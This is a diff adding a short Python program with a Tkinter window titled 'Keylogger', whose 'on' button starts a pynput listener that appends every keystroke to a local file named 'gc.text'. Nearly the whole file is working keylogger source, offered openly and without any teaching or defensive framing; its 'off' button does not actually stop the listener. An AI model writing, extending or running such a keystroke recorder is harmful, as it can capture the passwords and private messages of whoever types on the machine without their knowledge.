@@ -1,0 +1,65 @@
+from tkinter import *
+import os 
+from pynput.keyboard import Key, Listener
+import threading
+from threading import *
+
+file_path = "gc.text"
+keylogger_thread = None
+
+def on_press(key):
+    with open(file_path, "a") as f:
+        try:
+            f.write(f"{key.char}")
+        except AttributeError:
+            f.write(f"{key}")
+
+def on_release(key): # esc end the keylogger
+    if key == Key.esc:
+        return False
+                
+def keylogger_on():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def start_keylogger():
+    global keylogger_thread
+    keylogger_thread = threading.Thread(target=keylogger_on) 
+    keylogger_thread.start()
+    keylogger_thread.daemon = True
+
+
+def stop_keylogger():
+    if keylogger_thread and keylogger_thread.is_alive():
+        keylogger_thread.join(0) 
+
+
+window = Tk()
+window.geometry("480x480")
+window.title("keylogger")
+window.config(background='#FEFCFC')
+window.resizable(False, False)
+
+lable = Label(window, text= "Keylogger", font=('arial', 30))
+lable.place(x=150,y=100)
+
+button = Button(window,
+                text='    on    ',
+                command= start_keylogger,
+                state=ACTIVE,
+                font=(20)
+
+                )
+button.place(x=200,y=200)
+
+button_stop = Button(window,
+                text='    off    ',
+                command=stop_keylogger,
+                state=ACTIVE,
+                font=(20)
+
+) 
+
+button_stop.place(x=200,y=250)
+
+window.mainloop()
